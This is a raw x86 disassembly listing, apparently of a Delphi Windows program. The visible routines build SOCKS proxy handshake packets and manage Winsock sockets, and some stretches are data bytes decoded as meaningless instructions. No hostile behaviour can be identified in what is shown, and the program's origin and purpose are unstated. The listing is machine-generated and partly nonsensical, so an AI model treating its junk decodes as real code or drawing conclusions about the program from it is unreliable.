mov [ fs : eax ] esp
cmp [ esi + 0x32 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b2da
lea eax [ ebp - 0x10 ]
call sub_403eb4
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax [ ebp + 0x8 ]
inc eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
call sub_408aac
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
xor ecx ecx
call sub_408aac
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
jmp r-xdata
sub_45b2e4
push ebx
push esi
xor ebx ebx
mov bl dl
lea ebx [ ebx + ebx * 2 ]
inc [ eax + ebx * 4 + 0x58 ]
cmp [ eax + ebx * 4 + 0x58 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ eax + ebx * 4 + 0x54 ] ecx
xor esi esi
mov [ eax + ebx * 4 + 0x50 ] esi
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_45b31c
push ebx
push esi
xor ebx ebx
mov bl dl
lea esi [ ebx + ebx * 2 ]
cmp [ eax + esi * 4 + 0x58 ] 0x0
jle r-xdata
pop esi
pop ebx
retn
add [ eax + esi * 4 + 0x50 ] ecx
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ecx [ eax + esi * 4 + 0x50 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_45b34c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
lea edi [ eax + eax * 2 ]
cmp [ esi + edi * 4 + 0x58 ] 0x1
jne r-xdata
dec [ esi + edi * 4 + 0x58 ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x4a ] 0x0
je r-xdata
mov ecx ebx
mov edx esi
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
sub_45b37c
or [ eax ] eax
add [ eax ] al
clc
xchg ebx eax
inc esi
add al ch
xchg edi eax
inc esi
add ah dh
xchg ebx eax
inc esi
add al ch
xchg edi eax
inc esi
add al dh
xchg ebx eax
inc esi
add al ch
xchg edi eax
inc esi
add ah ch
xchg ebx eax
inc esi
add al ch
xchg edi eax
inc esi
add al ch
xchg ebx eax
inc esi
add [ eax + ebx * 4 + 0x46 ] bl
add ah ah
xchg ebx eax
inc esi
add [ edx + ebx * 4 - 0x6c1fffba ] dh
inc esi
add [ eax - 0x6a ] cl
inc esi
add ah bl
xchg ebx eax
inc esi
add al ch
cwde
inc esi
add al bl
xchg ebx eax
inc esi
add al ah
xchg esi eax
inc esi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45b404
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b40b
retn
mov eax rw-data
mov ecx 0x9
mov edx [ r-xdata ]
call sub_404930
sub_45b528
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45b1a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_45b55c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45b581
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b588
retn
sub_45b594
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45b5b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b5c0
retn
sub_45b880
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45b110
mov [ esi + 0x68 ] 0x0
mov [ esi + 0x7c ] 0x0
mov [ esi + 0x74 ] 0x438
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_45b8c4
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x114 ] ebx
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45bacd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x110 ] 0x4
mov [ ebp - 0x10f ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10e ] ax
cmp [ esi + 0x7c ] 0x2
jne r-xdata
lea ecx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_458d84
mov edx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45933c
mov [ ebp - 0x10c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_45933c
mov [ ebp - 0x10c ] eax
jmp r-xdata
add ebx 0x9
lea edx [ ebp - 0x110 ]
mov ecx ebx
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
lea edx [ ebp - 0x8 ]
mov ecx 0x8
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov al [ ebp - 0x7 ]
sub al 0x5a
je r-xdata
mov eax edi
call sub_404174
push eax
mov eax edi
call sub_404374
lea edx [ ebp + ebx - 0x106 ]
pop ecx
call sub_4028c8
mov eax edi
call sub_404174
inc ebx
add eax ebx
mov ebx eax
mov [ ebp + ebx - 0x107 ] 0x0
lea eax [ ebp - 0x108 ]
mov edx [ esi + 0x78 ]
mov ecx 0xff
call sub_404150
xor ebx ebx
mov bl [ ebp - 0x108 ]
mov [ ebp + ebx - 0x107 ] 0x0
cmp [ esi + 0x7c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bad4
lea eax [ ebp - 0x124 ]
mov edx 0x5
call sub_403ed8
retn
dec al
je r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x11c ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x11c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x124 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
sub_45baec
push ebp
mov ebp esp
push ecx
mov ecx 0x29
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45c0bf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov [ ebp - 0x10e ] 0x2
mov [ ebp - 0x10e ] 0x0
jmp r-xdata
mov al [ ebp - 0x10f ]
cmp al [ ebp - 0xd ]
jne r-xdata
mov al [ ebp - 0x10e ]
mov [ ebp - 0xd ] al
mov [ ebp - 0x110 ] 0x5
mov al 0x1
mov [ ebp - 0x10f ] al
and eax 0xff
add eax 0x2
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_4036ac#3
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
cmp al 0xff
jne r-xdata
mov [ ebp - 0x110 ] 0x5
mov [ ebp - 0x10f ] 0x1
mov [ ebp - 0x10e ] 0x0
mov [ ebp - 0x10d ] 0x3
mov eax [ ebp - 0x4 ]
call sub_404174
mov [ ebp - 0x10c ] al
mov esi 0x5
mov eax [ ebp - 0x4 ]
call sub_404174
test eax eax
jle r-xdata
mov [ ebp - 0x110 ] 0x1
mov eax [ ebx + 0x78 ]
call sub_404174
mov [ ebp - 0x10f ] al
mov esi 0x2
mov eax [ ebx + 0x78 ]
call sub_404174
test eax eax
jle r-xdata
cmp [ ebx + 0x68 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_404174
add esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10 ] ax
lea edx [ ebp + esi - 0x110 ]
lea eax [ ebp - 0x10 ]
mov ecx 0x2
call sub_4028c8
add esi 0x2
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor eax eax
push ebp
push sub_45be1f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x5
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404174
push eax
mov eax [ ebp - 0x4 ]
call sub_404374
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028c8
mov eax [ ebx + 0x78 ]
call sub_404174
add esi eax
mov eax [ ebx + 0x70 ]
call sub_404174
mov [ ebp + esi - 0x110 ] al
inc esi
mov eax [ ebx + 0x70 ]
call sub_404174
test eax eax
jle r-xdata
mov eax [ ebx + 0x78 ]
call sub_404174
push eax
mov eax [ ebx + 0x78 ]
call sub_404374
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028c8
xor eax eax
mov al [ ebp - 0x10f ]
cmp eax 0x8
ja r-xdata
mov eax [ ebx + 0x70 ]
call sub_404174
add esi eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_4036ac#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x70 ]
call sub_404174
push eax
mov eax [ ebx + 0x70 ]
call sub_404374
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028c8
lea edx [ ebp - 0x148 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x148 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp [ eax * 4 + r-xdata ]
cmp [ ebp - 0x10f ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
xor eax eax
push ebp
push j_sub_403580#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c0c6
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_403ed8
retn
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_45c0d0
push ebx
mov bl [ eax + 0x7c ]
dec ebx
sub bl 0x2
jb r-xdata
call sub_45b8c4
pop ebx
retn
je r-xdata
call sub_45baec
jmp r-xdata
pop ebx
retn
sub_45c0ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45c111
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c118
retn
sub_45c128
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
rol [ ebp ] 0xcc
rol [ ebp ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2c0045c1 ] dh
add [ eax ] al
add [ eax + ebx ] ch
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
mov esp 0x100045c4
inc ecx
inc ecx
add [ eax ] bl
inc ecx
inc ecx
add ah ch
enter 0x45 0x28
inc esp
inc ecx
add [ eax ] cl
inc ebp
inc ecx
add [ eax ] bh
inc ebp
inc ecx
add [ eax ] dh
inc ebp
inc ecx
add [ eax - 0x39 ] dl
inc ebp
add [ eax - 0x3c ] dl
inc ebp
add [ esp + eax * 8 - 0x3a8bffbb ] al
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
popad
outsb
insb
mov eax eax
int3
add [ eax ] al
[ eax + eax ]
add bh bh
add [ eax ] eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xc3
rol dl 0x1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
retn 0x45
dec ebp
imul ebp [ esi + 0x3c ] 0x28004010
add [ eax ] al
[ eax ]
jb r-xdata
dec esi
outsd
je r-xdata
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
dec ebx
add eax 0xe8a10000
0x8b0046 0xcf8b
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
add ah al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les eax [ ebp ]
or al 0x0
add [ eax ] al
test dl al
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
add [ ebx + esi ] bh
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x13460431
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
xor eax [ eax ]
cmp [ ebx ] dh
inc eax
add [ ebx + esi ] bh
imul ebp [ esi + 0x64 ] 0x74726f50
arpl [ ebx + 0x65 ] bp
je r-xdata
rcr [ eax + 0x45c3 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
retn
mov edx esi
call sub_458c8c
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov dl 0x1
mov eax ebx
call sub_45c980
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x15460365
inc ebp
dec ecx
inc ebx
outsd
jne r-xdata
popad
outsb
insb
inc ebp
jb r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x184603c9
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0045c3 ] bl
add [ eax ] al
add [ edx + eax * 8 + 0x33280045 ] al
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
inc ebp
add [ eax + eax ] cl
add [ eax ] al
test dl al
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
inc eax
add [ ebx + eax * 8 ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 8 ] dh
sub_45c414
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_458c8c
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_45c980
sub_45c484
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edx
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_45c938
mov eax ebx
call sub_45c95c
sub_45c4bc
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4143bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_45c4ec
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop ebx
pop ebp
retn 0x4
sub_45c510
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x54 ]
pop ebx
pop ebp
retn 0x4
sub_45c534
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458c38
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_45c574
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x4c ]
pop ebx
pop ebp
retn 0xc
sub_45c5a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45c6b4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax ebx
call sub_45c9b0
test al al
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c6bb
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403ed8
retn
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x28 ]
jle r-xdata
mov eax ebx
call sub_45ca04
test al al
jne r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
jmp r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
jmp r-xdata
sub_45c6c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebx + 0x18 ]
mov edx esi
call sub_403f08
mov [ ebx + 0x20 ] edi
pop edi
pop esi
pop ebx
retn
sub_45c6dc
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov dl 0x1
mov eax edi
call sub_45c980
lea eax [ edi + 0x1c ]
push eax
lea ecx [ edi + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov esi eax
push 0x1
mov [ esp + 0x4 ] 0x2714
mov [ esp + 0x8 ] 0x2736
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_458c44
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ edi + 0xc ] esi
mov [ edi + 0x10 ] 0x1
mov eax edi
call sub_45c938
mov eax edi
call sub_45c95c
sub_45c750
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_414384
mov dl 0x1
mov eax edi
call sub_45c980
xor eax eax
mov [ edi + 0x24 ] eax
xor eax eax
mov [ edi + 0x28 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_45c7a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45c8d9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ r-xdata ]
call sub_45aed0
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45c8bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413898
push 0x0
push esi
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_45ae8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4030f8
retn
cmp esi 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
cmp esi eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x34 ]
mov eax ebx
call sub_45c7a8
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx esi
sub edx eax
mov eax ebx
call sub_45c7a8
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c8e0
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x34 ]
sub_45c8ec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_403040
mov edi eax
mov eax esi
call sub_403040
cmp edi eax
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_403f08
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
lea eax [ ebx + 0x18 ]
mov edx [ esi + 0x18 ]
call sub_403f08
mov eax [ esi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov edx esi
mov eax ebx
call sub_41402c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45c938
push ebx
push ecx
lea edx [ eax + 0x14 ]
push edx
lea edx [ eax + 0x1c ]
push edx
